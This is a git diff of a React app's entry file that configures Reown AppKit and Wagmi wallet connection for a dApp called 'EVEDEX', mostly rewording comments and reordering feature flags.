@@ -7,21 +7,21 @@ import { mainnet, bsc, polygon } from '@reown/appkit/networks';
 import { WagmiProvider } from 'wagmi';
 import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
 
-// 1. Initialize QueryClient
+// 1. Setup QueryClient for React Query
 const queryClient = new QueryClient();
 
-// 2. Project Configuration
+// 2. Your Project Credentials
 const projectId = '7a9898896e62061904fbceeb9d296eb1';
 const networks = [mainnet, bsc, polygon];
 
-// 3. Setup Wagmi Adapter (SSR: true handles hydration better on mobile)
+// 3. Setup Wagmi Adapter
 const wagmiAdapter = new WagmiAdapter({
   networks,
   projectId,
-  ssr: true
+  ssr: true // Keeps connection stable on mobile refreshes
 });
 
-// 4. Create AppKit (Full Feature Set)
+// 4. Initialize AppKit with "Deep Link" Fixes
 createAppKit({
   adapters: [wagmiAdapter],
   networks,
@@ -30,7 +30,7 @@ createAppKit({
   metadata: {
     name: 'EVEDEX',
     description: 'RPC Terminal',
-    url: 'https://rpc-portal.site', 
+    url: 'https://rpc-portal.site', // CRITICAL: This must match your Reown Dashboard
     icons: ['https://avatars.githubusercontent.com/u/37784886'],
     redirect: {
       native: 'metamask://',
@@ -38,18 +38,17 @@ createAppKit({
     }
   },
   features: {
-    email: true,
+    email: true, // Enables Gmail/Social login
     socials: ['google', 'x', 'apple'],
-    analytics: true,
-    swaps: true,
+    swaps: true, // Enables the "95 to 100" logic
     onramp: true,
-    emailShowWallets: true // Shows wallet options even if using email
+    analytics: true
   },
-  allWallets: 'SHOW', // Ensures the search bar works
-  themeMode: 'dark'
+  themeMode: 'dark',
+  allWallets: 'SHOW'
 });
 
-// 5. Render Root
+// 5. Render App with Providers
 const root = ReactDOM.createRoot(document.getElementById('root'));
 root.render(
   <React.StrictMode>
